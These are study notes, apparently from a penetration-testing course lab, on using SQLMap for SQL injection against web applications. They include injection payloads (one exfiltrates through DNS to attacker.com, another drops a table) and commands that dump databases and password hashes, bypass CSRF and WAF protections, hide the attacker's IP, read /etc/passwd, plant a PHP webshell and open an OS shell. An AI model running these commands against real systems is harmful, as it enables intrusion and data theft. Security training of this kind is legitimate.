# SQLMap Essentials

1. [Introduction](#introduction)
1. [Building Attacks](#building-attacks)
1. [Database Enumeration](#database-enumeration)
1. [Advanced SQLMap Usage](#advanced-sqlmap-usage)
1. [Skills Assessment](#skills-assessment)

## Introduction

* Supported SQLi types:

  * Boolean-based blind:

    * Example:

      ```sql
      AND 1=1
      ```

    * ```SQLMap``` exploits this by differentiating ```TRUE``` (similar to regular server response) from ```FALSE``` (quite different from regular server response) query results

    * most common SQLi type in web apps
  
  * Error-based:

    * Example:

      ```sql
      AND GTID_SUBSET(@@version,0)
      ```

    * for cases in which DBMS errors are being returned in server response
  
  * UNION query-based:

    * Example:

      ```sql
      UNION ALL SELECT 1,@@version,3
      ```

    * fastest SQLi type as vulnerable query can be extended with injected statement
  
  * Stacked queries:

    * Example:

      ```sql
      ; DROP TABLE users
      ```

    * aka 'piggy-backing'; form of injecting additional SQL statements after vulnerable query
  
  * Time-based blind:

    * Example:

      ```sql
      AND 1=IF(2>1,SLEEP(5),0)
      ```

    * similar to boolean-based blind SQLi, but here response time is used to differentiate between ```TRUE``` (noticeable difference in response time from usual server response) or ```FALSE``` (no difference)
  
  * Inline queries:

    * Example:

      ```sql
      SELECT (SELECT @@version) from
      ```

    * embedded query within original query
  
  * Out-of-band:

    * Example:

      ```sql
      LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
      ```

    * advanced SQLi type; ```SQLMap``` supports this through DNS exfiltration

* For help, we can refer to the [wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage), or commands ```sqlmap -h``` (basic listing) and ```sqlmap -hh``` (advanced listing).

## Building Attacks

* An easy way to setup an ```SQLMap``` request is by using the ```Copy as cURL``` feature from Developer Tools (from browser), and after pasting the command, we can replace ```curl``` with ```sqlmap```:

  ```shell
  sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
  ```

* For GET requests, usually the URL will have parameters included; for POST requests, we can use the ```--data``` flag.

* We can mark specific parameters as well. For example, if we know that a particular parameter 'uid' is prone to SQLi, we can narrow it down using ```-p uid```, or like this:

  ```shell
  sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
  ```

* For complex HTTP requests, we can use the ```-r``` flag, coupled with a request file, which can be intercepted and saved from Burp Suite.

* For specifying session/cookie values, we can use ```--cookie``` flag; alternatively, we can use the ```-H``` or ```--header``` flag.

* Besides customizing ```SQLMap``` requests, we can customize HTTP requests as well (JSON, XML formats supported).

* Example uses:

  ```shell
  # SQLi vulnerability in POST parameter 'id'
  # we can check Developer Tools to confirm the request
  sqlmap 'http://83.136.253.251:55415/case2.php' --data 'id=1' --batch --dump
  # --batch used for non-interactive session
  # --dump to dump all data
  ```

  ```shell
  # SQLi vulnerability in cookie value 'id=1'
  # we can copy the request 'copy as curl' from browser
  # ensure to add asterisk in cookie value to point SQLi
  sqlmap 'http://94.237.62.195:56158/case3.php' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.62.195:56158/' -H 'Connection: keep-alive' -H 'Cookie: id=1*' -H 'Upgrade-Insecure-Requests: 1' --batch --dump
  ```

  ```shell
  # SQLi vuln in JSON data {"id": 1}
  # we can intercept request using Burp Suite
  # and save it to a file

  sqlmap -r req-json.txt --batch --dump
  ```

* Attack tuning:

  * For special prefix and suffix values (if required), we can use the ```--prefix``` and ```--suffix``` flag respectively, which will enclose the vector value (payload)

  * Level (```--level```) and risk (```--risk```) can be specified to set payloads, based on success level and risk to target

  * For advanced tuning, we can look into the following options:

    * status codes - ```--code```
    * titles - ```--titles```
    * strings - ```--string```
    * text-only - ```--text-only```
    * techniques - ```--technique```
    * UNION SQLi tuning - ```--union-cols```, ```--union-char```, etc.
  
  * Example uses:

    ```shell
    # exploit OR SQLi vuln in GET param 'id'
    sqlmap -u 'http://83.136.253.251:33659/case5.php?id=1' --batch --dump
    # did not work
    # we can add some more parameters for tuning

    sqlmap -u 'http://94.237.63.93:57347/case5.php?id=1' -T flag5 --risk=3 --level=5 --no-cast --batch --dump
    # -T flag5 since we want to dump only that particular table
    # --no-cast to avoid cast-alike statements when fetching data, reduce payload size
    ```

    ```shell
    # exploit SQLi vuln in GET param 'col' with non-standard boundaries
    sqlmap -u 'http://94.237.63.93:53938/case6.php?col=id' -T flag6 --dbms="MySQL" --risk=3 --level=5 --batch --dump -v 3
    # --dbms added as it is known
    # -v 3 for verbosity
    # query still timed out, so we can add some custom parameters
    # based on incomplete findings from prev query

    sqlmap -u 'http://83.136.251.235:48127/case6.php?col=id' -D testdb -T flag6 -C id,content --dbms mysql --risk=3 --level=5 --technique="T" --prefix='`)' --batch --dump -v 3
    # -D for database
    # -C for columns of table 'flag6'
    # --technique=T for time-based blind SQLi
    # prefix has been added additionally to save time
    ```

    ```shell
    # exploit SQLi vuln in GET param 'id' using UNION query technique
    sqlmap -u 'http://94.237.55.163:42101/case7.php?id=1' -D testdb --dbms mysql --technique="U" --union-cols=5 --risk=3 --level=5 --no-cast --batch --dump -v
    # --technique="U" for UNION-query based technique
    # --union-cols=5 as 5 columns shown in webpage output
    # removed table and column data from query to keep things simple
    ```

## Database Enumeration

* After a successful detection of SQLi vulnerability, we can enumerate some basic info:

  * DB version banner - ```--banner```
  * current username - ```--current-user```
  * current DB name - ```--current-db```
  * checking if user has DBA (admin) rights

  ```shell
  # get the above info
  sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

  # table enumeration
  sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

  # get contents of table
  sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb

  # get column info
  sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

  sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
  # only includes column 2 & 3

  # conditional enumeration
  sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

  # use --dump without specifying table to get all info from current DB
  # use --dump-all to get all content from all DBs
  # use --exclude-sysdbs to skip system DBs as it does not contain useful info
  ```

* Advanced database enumeration:

  ```shell
  # retrieve structure of all tables
  sqlmap -u "http://www.example.com/?id=1" --schema

  # to search for all table names containing keyword 'user'
  sqlmap -u "http://www.example.com/?id=1" --search -T user

  # search for all column names containing keyword 'pass'
  sqlmap -u "http://www.example.com/?id=1" --search -C pass

  # once we dump table info, we get option to crack passwords using dictionary attack
  sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users

  # to dump system tables containing DB-specific creds, use --password flag
  sqlmap -u "http://www.example.com/?id=1" --passwords --batch
  ```

## Advanced SQLMap Usage

* Bypassing web app protections:

  * Anti-CSRF (Cross-Site Request Forgery) token bypass:

    ```shell
    # use --csrf-token switch and specify the token parameter name
    sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

    # in case of non-standard name, we can intercept request to check and get name
    sqlmap -u 'http://94.237.63.93:33675/case8.php' --data='id=1&t0ken=R7JwJghlq90SG77wwhQrz116YqfCtHaCnGe9kgBw2e8' --csrf-token="t0ken" --batch --dump
    ```
  
  * Unique value bypass:
  
    ```shell
    # use --randomize for parameters which only require unique values
    sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch
    # value of 'rp' will be random
    ```
  
  * Calculated parameter bypass:

    ```shell
    # for cases where parameter value is calculated based on other values
    sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
    # here 'h' is MD5 hash of 'id'
    ```
  
  * IP address concealing:

    ```shell
    # we can use --proxy, or --proxy-file if we have list of proxies
    # if Tor is setup, we can use --tor as well with SOCKS4 proxy

    sqlmap -u "http://www.example.com/?id=1" --proxy="socks4://177.39.187.70:33283"
    # it should be a working proxy
    ```
  
  * User-agent blacklist bypass:

    ```shell
    # random user-agents can be used if we are getting 5xx errors
    # or if default user-agent of sqlmap is blocked
    sqlmap -u "http://www.example.com/?id=1" --random-agent
    ```
  
  * Tamper scripts:

    * Python scripts written for modifying requests just before being sent to target
    * used for bypassing primitive protection, WAF/IPS
    * use ```--tamper==<tamper-script-name>``` flag; multiple scripts can be used (comma-separated)
  
  * Miscellaneous bypasses:

    * chunked transfer encoding; splits POST request body into chunks - ```--chunked```
    * HTTP parameter pollution (HPP); payloads split between different but same parameter named values

* OS Exploitation:

  * File read/write:

    * read/write operation depends on permissions
    * example command - ```LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;```
  
  * Checking for DBA privileges:

    ```shell
    sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
    ```
  
  * Reading local files:

    ```shell
    sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
    ```
  
  * Writing local files:

    ```shell
    sqlmap -u "http://www.example.com/?id=1" --file-write "basic-webshell.php" --file-dest "/var/www/html/basic-webshell.php"
    # if file write is successful
    # we can use curl to access remote php webshell
    ```
  
  * OS command execution:

    ```shell
    # no need to write a remote shell manually
    sqlmap -u "http://www.example.com/?id=1" --os-shell
    # if default UNION technique does not work for shell
    # try other methods, like using '--technique=E'
    ```

## Skills Assessment

* While navigating the website, we can intercept requests using Burp Suite to check the request-response closely; we see a POST request with JSON data sent when adding an item to cart - intercept and save this request to a file.

  ```shell
  sqlmap -r req-1.txt --batch --dump
  # this will not work as the site has basic protection mechanisms in place

  sqlmap -r req-1.txt --risk=3 --level=5 --no-cast --batch --dump --tamper=between --random-agent -T final_flag
  ```
